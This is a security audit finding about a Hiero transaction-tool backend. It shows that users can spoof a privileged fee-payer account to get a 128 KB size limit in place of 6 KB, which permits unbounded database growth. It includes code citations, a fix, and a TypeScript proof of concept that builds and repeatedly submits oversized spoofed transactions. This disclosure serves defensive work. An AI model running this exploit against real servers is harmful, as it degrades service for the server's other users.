Audit Report

## Title
Unprivileged Users Can Bypass the 6 KB Transaction Size Limit by Spoofing a Privileged Fee Payer Account ID

## Summary
Any authenticated user can set a privileged governance account (e.g., `0.0.2`, `0.0.42`–`0.0.799`) as the fee payer inside the attacker-controlled `transactionBytes`, causing the backend to apply the 128 KB HIP-1300 limit instead of the standard 6 KB limit. The signature check only verifies that the submitting user's registered key signed the raw bytes — it never verifies that the user controls the fee payer account embedded in the `transactionId`. This allows a normal user to store transactions up to 21× larger than permitted, enabling unbounded database storage growth.

## Finding Description

**Root cause**: `validateAndPrepareTransaction` in `back-end/apps/api/src/transactions/transactions.service.ts` performs two independent checks that do not cross-validate each other:

1. **Signature check** (line 910): `publicKey.verify(dto.transactionBytes, dto.signature)` — confirms the user's registered key signed the raw bytes. It does not verify that the fee payer account in `transactionId.accountId` belongs to the submitting user. [1](#0-0) 

2. **Size check** (line 929): `isTransactionBodyOverMaxSize(sdkTransaction)` — derives the size limit from the fee payer account embedded inside the attacker-controlled `transactionBytes`. [2](#0-1) 

`isTransactionBodyOverMaxSize` calls `getMaxTransactionSizeForTransaction`, which reads the fee payer directly from `tx.transactionId?.accountId` — a field that is entirely user-supplied: [3](#0-2) [4](#0-3) 

`isPrivilegedFeePayer` returns `true` for `0.0.2` or any account in `0.0.42–0.0.799`, triggering the 128 KB limit: [5](#0-4) 

The two size constants are: [6](#0-5) 

Both `transactionBytes` and `unsignedTransactionBytes` are stored as unbounded `bytea` columns with no database-level size constraint: [7](#0-6) 

The node validation check (line 934) does not mitigate this — the attacker can include valid network node IDs while still spoofing the fee payer. [8](#0-7) 

## Impact Explanation
Each stored transaction occupies up to 128 KB × 2 (`transactionBytes` + `unsignedTransactionBytes`) = 256 KB per row, versus the intended ~12 KB. Using different `validStart` timestamps bypasses the duplicate `transactionId` check, allowing unlimited unique records. At the API's rate limit (100 req/min), a single attacker can write ~12.8 MB/min to the database (vs ~600 KB/min under the correct 6 KB limit). With multiple accounts, this scales linearly. There is no per-user storage quota or total transaction count cap, leading to unbounded database growth and service degradation for all users of the organization server.

## Likelihood Explanation
The attack requires only a valid authenticated account and a registered key pair — the minimum access level for any user of the tool. No privileged credentials, no admin access, and no special knowledge beyond the publicly documented HIP-1300 account range are needed. The `POST /transactions` endpoint is the primary workflow entry point. The exploit is deterministic and reproducible with standard Hiero SDK calls.

## Recommendation
Enforce the size limit based on the submitting user's registered accounts, not the fee payer embedded in the transaction bytes. Specifically, before applying the privileged 128 KB limit, verify that the fee payer account (`sdkTransaction.transactionId.accountId`) is registered to the submitting user (i.e., appears in `user.keys` or the user's associated accounts). If the fee payer is not owned by the submitting user, apply the standard 6 KB limit regardless of what account ID is embedded in the bytes.

Alternatively, always apply the standard 6 KB limit for all user-submitted transactions and only allow the 128 KB limit for transactions where the fee payer is verifiably controlled by the submitting user.

## Proof of Concept
```typescript
import {
  FileUpdateTransaction,
  FileId,
  TransactionId,
  AccountId,
  Timestamp,
  PrivateKey,
} from '@hiero-ledger/sdk';

// Attacker's registered key pair (normal user, e.g. 0.0.1001)
const attackerKey = PrivateKey.generateED25519();

// Construct a ~128 KB FileUpdateTransaction with treasury (0.0.2) as fee payer
const validStart = Timestamp.fromDate(new Date());
const tx = new FileUpdateTransaction()
  .setFileId(FileId.fromString('0.0.150'))
  .setContents(Buffer.alloc(127_000, 0x41))  // ~127 KB of data
  .setTransactionId(
    TransactionId.withValidStart(
      AccountId.fromString('0.0.2'),  // ← spoofed treasury as fee payer
      validStart,
    ),
  )
  .setNodeAccountIds([AccountId.fromString('0.0.3')])
  .freeze();

const txBytes = tx.toBytes();

// Sign with attacker's own key (not treasury's key)
const signature = attackerKey.sign(txBytes);

// POST /transactions
// {
//   transactionBytes: Buffer.from(txBytes).toString('base64'),
//   signature: Buffer.from(signature).toString('base64'),
//   creatorKeyId: <attacker's registered key id>,
//   mirrorNetwork: 'testnet',
//   name: 'test',
//   description: 'test'
// }
//
// Result: signature check passes (attacker's key signed the bytes),
//         size check passes (128 KB limit applies because fee payer is 0.0.2),
//         ~127 KB transaction stored in database.
// Repeat with different validStart to store unlimited 128 KB records.
```

### Citations

**File:** back-end/apps/api/src/transactions/transactions.service.ts (L907-913)
```typescript
    const publicKey = PublicKey.fromString(creatorKey.publicKey);

    // Verify signature
    const validSignature = publicKey.verify(dto.transactionBytes, dto.signature);
    if (!validSignature) {
      throw new BadRequestException(ErrorCodes.SNMP);
    }
```

**File:** back-end/apps/api/src/transactions/transactions.service.ts (L928-931)
```typescript
    // Check size
    if (isTransactionBodyOverMaxSize(sdkTransaction)) {
      throw new BadRequestException(ErrorCodes.TOS);
    }
```

**File:** back-end/apps/api/src/transactions/transactions.service.ts (L933-937)
```typescript
    // Check nodes
    const allowedNodes = getNodeAccountIdsFromClientNetwork(client);
    if (!isTransactionValidForNodes(sdkTransaction, allowedNodes)) {
      throw new BadRequestException(ErrorCodes.TNVN);
    }
```

**File:** back-end/libs/common/src/utils/sdk/transaction.ts (L328-333)
```typescript
export function isTransactionBodyOverMaxSize(transaction: SDKTransaction) {
  const bodyBytes = getTransactionBodyBytes(transaction);
  // HIP-1300: limit depends on the fee payer (privileged accounts get 128 KB).
  const maxSize = getMaxTransactionSizeForTransaction(transaction);
  return bodyBytes.length > maxSize;
}
```

**File:** back-end/libs/common/src/utils/sdk/privileged-payer.ts (L22-27)
```typescript
export function isPrivilegedFeePayer(accountId: AccountId | null | undefined): boolean {
  if (!accountId) return false;
  if (accountId.shard.toNumber() !== 0 || accountId.realm.toNumber() !== 0) return false;
  const num = accountId.num.toNumber();
  return num === 2 || (num >= 42 && num <= 799);
}
```

**File:** back-end/libs/common/src/utils/sdk/privileged-payer.ts (L33-35)
```typescript
export function getFeePayerFromSdkTransaction(tx: SDKTransaction): AccountId | null {
  return tx.transactionId?.accountId ?? null;
}
```

**File:** back-end/libs/common/src/database/entities/transaction.entity.ts (L58-61)
```typescript
export const MAX_TRANSACTION_BYTE_SIZE = 6_144;
// HIP-1300: privileged governance fee payers (0.0.2 and 0.0.42-0.0.799) get an
// increased transaction size limit of 128 KB to accommodate council signatures.
export const MAX_PRIVILEGED_TRANSACTION_BYTE_SIZE = 131_072;
```

**File:** back-end/libs/common/src/database/entities/transaction.entity.ts (L92-99)
```typescript
  @Column({ type: 'bytea' })
  transactionBytes: Buffer;

  @ApiProperty({
    description: 'The transaction in bytes. This transaction does not contain any signatures.',
  })
  @Column({ type: 'bytea' })
  unsignedTransactionBytes: Buffer;
```
